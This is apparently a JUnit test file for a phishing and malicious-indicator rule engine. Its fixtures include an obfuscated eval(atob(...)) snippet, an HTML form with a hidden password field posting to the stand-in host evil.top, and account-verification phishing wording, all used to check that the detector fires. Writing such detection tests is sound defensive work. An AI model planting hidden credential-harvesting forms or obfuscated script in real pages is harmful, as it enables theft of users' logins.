package com.dt124.extractor;

import org.junit.jupiter.api.Test;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertTrue;

class SafeIndicatorRuleEngineTest {

    private final SafeIndicatorRuleEngine engine = new SafeIndicatorRuleEngine();

    @Test
    void loadsDefaultRules() {
        assertTrue(engine.ruleNames().contains("eval_obfuscation"));
        assertTrue(engine.ruleNames().contains("hidden_login_form"));
        assertTrue(engine.ruleNames().size() >= 8);
    }

    @Test
    void detectsObfuscationAndBase64() {
        String text = "var x = eval(atob('QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVowMTIzNDU2Nzg5')) ;";
        IndicatorAnalysis analysis = engine.scan(text);

        assertTrue(analysis.get("eval_obfuscation") > 0);
        assertTrue(analysis.getTotalHits() > 0);
    }

    @Test
    void detectsHiddenLoginForm() {
        String html = "<form action=\"http://evil.top\"><input type=\"password\" style=\"display:none\"></form>";
        IndicatorAnalysis analysis = engine.scan(html);

        assertTrue(analysis.get("hidden_login_form") > 0);
    }

    @Test
    void detectsCredentialHarvestLanguage() {
        IndicatorAnalysis analysis = engine.scan("Please verify your account immediately, unusual sign-in detected.");

        assertTrue(analysis.get("credential_harvest") > 0);
    }

    @Test
    void benignTextHasNoHits() {
        IndicatorAnalysis analysis = engine.scan("Hi, please review the attached schedule before Friday. Thanks.");

        assertEquals(0, analysis.getTotalHits());
    }
}
